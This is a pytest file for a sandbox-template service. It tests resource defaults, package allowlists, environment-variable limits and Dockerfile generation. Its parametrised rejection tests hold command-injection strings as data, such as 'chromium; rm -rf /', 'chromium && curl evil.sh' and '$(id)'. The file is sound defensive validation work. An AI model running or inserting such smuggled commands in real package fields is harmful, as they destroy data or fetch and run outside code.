from __future__ import annotations

import json

import pytest
from pydantic import ValidationError

from harborbox.config import Settings
from harborbox.schemas import SandboxCreate
from harborbox.templates import (
    TemplateSpec,
    TemplateSpecError,
    render_dockerfile,
    split_npm_package,
    validate_template_spec,
)


def spec_for(settings: Settings, **overrides: object) -> TemplateSpec:
    payload: dict[str, object] = {
        "base": "relaydeck",
        "apt": [],
        "npm": [],
        "env": {},
    }
    payload.update(overrides)
    return validate_template_spec(settings, **payload)  # type: ignore[arg-type]


def test_template_is_mandatory() -> None:
    with pytest.raises(ValidationError):
        SandboxCreate.model_validate({})


def test_template_defaults_are_profile_specific() -> None:
    settings = Settings()

    assert settings.resources_for_template("relaydeck") == (256, 0.5)
    # 1.0 CPU, not 2.0: measured against the real analysis workload, DuckDB
    # profiling of a CSV finished in ~2.5s at 1.0 CPU and the run was dominated
    # by the model, not compute. Halving it doubles how many sandboxes fit.
    assert settings.resources_for_template("onvo-pro") == (1024, 1.0)
    assert settings.resources_for_template("onvo-lite") == (1024, 1.0)


def test_unregistered_template_has_no_generic_fallback() -> None:
    settings = Settings()

    with pytest.raises(KeyError, match="registered sandbox template"):
        settings.image_for_template(None)

    with pytest.raises(KeyError):
        settings.image_for_template("not-a-template")


def test_warm_pool_must_fit_configured_memory_budget() -> None:
    with pytest.raises(ValidationError, match="warm pool exceeds"):
        Settings(sandbox_memory_budget_mb=1024)


def test_derived_image_name_is_a_pure_function_of_the_template_name() -> None:
    settings = Settings()

    assert settings.base_of_derived_template("relaydeck-a1b2c3d4e5f6") == "relaydeck"
    assert settings.base_of_derived_template("onvo-pro-a1b2c3d4e5f6") == "onvo-pro"
    assert (
        settings.image_for_template("relaydeck-a1b2c3d4e5f6")
        == "harborbox-sandbox-relaydeck-a1b2c3d4e5f6:local"
    )
    # A derived template inherits its base's sizing unless the registry overrides it.
    assert settings.resources_for_template("relaydeck-a1b2c3d4e5f6") == (256, 0.5)


@pytest.mark.parametrize(
    "name",
    [
        "relaydeck-a1b2c3d4e5",  # too short
        "relaydeck-a1b2c3d4e5f6a",  # too long
        "relaydeck-A1B2C3D4E5F6",  # not lowercase hex
        "relaydeck-g1b2c3d4e5f6",  # not hex
        "unknown-a1b2c3d4e5f6",  # unknown base
        "relaydeck",  # a static template, not a derived one
    ],
)
def test_malformed_derived_names_are_not_treated_as_derived(name: str) -> None:
    assert Settings().base_of_derived_template(name) is None


def test_spec_hash_is_deterministic_and_order_independent() -> None:
    settings = Settings()

    first = spec_for(
        settings,
        apt=["fonts-liberation", "chromium"],
        npm=["@playwright/mcp@0.0.78"],
        env={"PLAYWRIGHT_BROWSERS_PATH": "0"},
    )
    second = spec_for(
        settings,
        apt=["chromium", "chromium", "fonts-liberation"],
        npm=["@playwright/mcp@0.0.78", "@playwright/mcp@0.0.78"],
        env={"PLAYWRIGHT_BROWSERS_PATH": "0"},
    )

    assert first.apt == ("chromium", "fonts-liberation")
    assert first.spec_hash == second.spec_hash
    assert first.name == f"relaydeck-{first.spec_hash}"
    assert len(first.spec_hash) == 12


def test_canonical_json_matches_the_published_contract() -> None:
    spec = spec_for(
        Settings(),
        apt=["chromium"],
        npm=["@playwright/mcp@0.0.78"],
        env={"PLAYWRIGHT_BROWSERS_PATH": "0"},
    )

    assert spec.canonical_json() == json.dumps(
        {
            "apt": ["chromium"],
            "base": "relaydeck",
            "env": {"PLAYWRIGHT_BROWSERS_PATH": "0"},
            "npm": ["@playwright/mcp@0.0.78"],
        },
        separators=(",", ":"),
        sort_keys=True,
    )


def test_resource_overrides_do_not_change_the_spec_hash() -> None:
    settings = Settings()

    # Resource overrides are not part of the spec and never reach TemplateSpec,
    # so two teams differing only in sizing still share one image.
    assert spec_for(settings, apt=["chromium"]).spec_hash == spec_for(
        settings, apt=["chromium"]
    ).spec_hash


def test_an_empty_spec_resolves_to_the_base_template() -> None:
    spec = spec_for(Settings())

    assert spec.is_empty is True
    assert spec.name == "relaydeck"


def test_a_spec_round_trips_through_its_stored_json() -> None:
    spec = spec_for(
        Settings(),
        apt=["chromium"],
        npm=["@playwright/mcp"],
        env={"PLAYWRIGHT_BROWSERS_PATH": "0"},
    )

    assert TemplateSpec.from_json(spec.as_json()).spec_hash == spec.spec_hash


@pytest.mark.parametrize(
    "package",
    [
        "chromium; rm -rf /",
        "chromium && curl evil.sh",
        "chromium$(id)",
        "chromium`id`",
        "chromium\nfonts-liberation",
        "--allow-downgrades",
        "chromium ",
        "chromium|tee",
        "chrómium",
        "chromium\x00",
        "",
    ],
)
def test_apt_package_metacharacters_are_rejected(package: str) -> None:
    with pytest.raises(TemplateSpecError):
        spec_for(Settings(), apt=[package])


def test_seeded_apt_allowlist_only_contains_debian_bookworm_names() -> None:
    # `font-noto` is an Alpine name and does not exist on bookworm, which is what
    # every static base image is built from.
    allowlist = Settings().template_apt_allowlist

    assert "font-noto" not in allowlist
    assert "fonts-noto-core" in allowlist
    assert {"chromium", "fonts-liberation"} <= allowlist


def test_apt_packages_must_be_allowlisted_even_when_well_formed() -> None:
    with pytest.raises(TemplateSpecError, match="not allowlisted"):
        spec_for(Settings(), apt=["build-essential"])

    assert spec_for(
        Settings(template_apt_allowlist=frozenset({"build-essential"})),
        apt=["build-essential"],
    ).apt == ("build-essential",)


@pytest.mark.parametrize(
    "package",
    [
        "@playwright/mcp@0.0.78; id",
        "@playwright/mcp@$(id)",
        "@playwright/mcp@0.0.78 --foo",
        "../@playwright/mcp",
        "@playwright/mcp@0.0.78@extra",
        "@Playwright/MCP",
    ],
)
def test_npm_specifier_metacharacters_and_shapes_are_rejected(package: str) -> None:
    with pytest.raises(TemplateSpecError):
        spec_for(Settings(), npm=[package])


def test_npm_allowlist_matches_the_package_not_the_pinned_version() -> None:
    settings = Settings()

    assert spec_for(settings, npm=["@playwright/mcp@0.0.78"]).npm == (
        "@playwright/mcp@0.0.78",
    )
    with pytest.raises(TemplateSpecError, match="not allowlisted"):
        spec_for(settings, npm=["left-pad@1.3.0"])


def test_npm_specifiers_split_on_the_version_separator() -> None:
    assert split_npm_package("@playwright/mcp@0.0.78") == ("@playwright/mcp", "0.0.78")
    assert split_npm_package("@playwright/mcp") == ("@playwright/mcp", None)
    assert split_npm_package("left-pad@1.3.0") == ("left-pad", "1.3.0")


def test_list_lengths_are_capped() -> None:
    settings = Settings(template_max_apt_packages=2, template_max_npm_packages=1)

    with pytest.raises(TemplateSpecError, match="at most 2 apt packages"):
        spec_for(settings, apt=["chromium", "fonts-noto-core", "redis-tools"])
    with pytest.raises(TemplateSpecError, match="at most 1 npm packages"):
        spec_for(settings, npm=["@playwright/mcp", "@playwright/mcp@1"])


@pytest.mark.parametrize(
    "name",
    ["lowercase", "1LEADING_DIGIT", "HAS-DASH", "HAS SPACE", "TOO_LONG" + "G" * 64, ""],
)
def test_environment_variable_names_must_match_the_contract(name: str) -> None:
    with pytest.raises(TemplateSpecError, match="environment variable name"):
        spec_for(Settings(), env={name: "value"})


def test_environment_variables_are_capped_in_count_and_size() -> None:
    settings = Settings(template_max_env_vars=1, template_max_env_value_length=4)

    with pytest.raises(TemplateSpecError, match="at most 1 environment"):
        spec_for(settings, env={"ONE": "a", "TWO": "b"})
    with pytest.raises(TemplateSpecError, match="exceeds 4 characters"):
        spec_for(settings, env={"ONE": "abcde"})
    with pytest.raises(TemplateSpecError, match="control or non-ASCII"):
        spec_for(settings, env={"ONE": "a\nb"})


def test_the_base_must_be_a_statically_registered_template() -> None:
    with pytest.raises(TemplateSpecError, match="unknown base template"):
        spec_for(Settings(), base="relaydeck-a1b2c3d4e5f6", apt=["chromium"])
    with pytest.raises(TemplateSpecError, match="unknown base template"):
        spec_for(Settings(), base="nonsense", apt=["chromium"])


def test_generated_dockerfile_reacquires_and_drops_root() -> None:
    spec = spec_for(
        Settings(),
        apt=["chromium", "fonts-liberation"],
        npm=["@playwright/mcp@0.0.78"],
        env={"PLAYWRIGHT_SKIP_BROWSER_DOWNLOAD": "1"},
    )

    dockerfile = render_dockerfile(
        base_image="harborbox-sandbox-relaydeck:local", spec=spec
    )
    lines = dockerfile.splitlines()

    assert lines[0] == "FROM harborbox-sandbox-relaydeck:local"
    assert lines[1] == "USER root"
    assert lines[-1] == "USER 10001:10001"
    assert "apt-get install -y --no-install-recommends" in dockerfile
    assert "npm install --global --no-audit --no-fund" in dockerfile
    assert "npm cache clean --force" in dockerfile
    assert 'ENV PLAYWRIGHT_SKIP_BROWSER_DOWNLOAD="1"' in dockerfile


def test_generated_dockerfile_sets_env_before_the_install_layers() -> None:
    # PLAYWRIGHT_SKIP_BROWSER_DOWNLOAD only suppresses Playwright's browser
    # download if it is already set when `npm install -g` runs. An ENV emitted
    # after the npm layer would silently do nothing.
    spec = spec_for(
        Settings(),
        apt=["chromium"],
        npm=["@playwright/mcp@0.0.78"],
        env={"PLAYWRIGHT_SKIP_BROWSER_DOWNLOAD": "1"},
    )

    dockerfile = render_dockerfile(base_image="base:local", spec=spec)
    instructions = [
        line.split()[0]
        for line in dockerfile.splitlines()
        if line and not line.startswith((" ", "\t"))
    ]

    assert instructions == ["FROM", "USER", "ENV", "RUN", "RUN", "USER"]
    assert dockerfile.index("ENV PLAYWRIGHT_SKIP_BROWSER_DOWNLOAD") < dockerfile.index(
        "apt-get"
    )
    assert dockerfile.index("ENV PLAYWRIGHT_SKIP_BROWSER_DOWNLOAD") < dockerfile.index(
        "npm install"
    )


def test_generated_dockerfile_neutralises_env_value_expansion() -> None:
    spec = spec_for(Settings(), env={"TOKEN": 'a"b$HOME'})

    dockerfile = render_dockerfile(base_image="base:local", spec=spec)

    assert 'ENV TOKEN="a\\"b\\$HOME"' in dockerfile
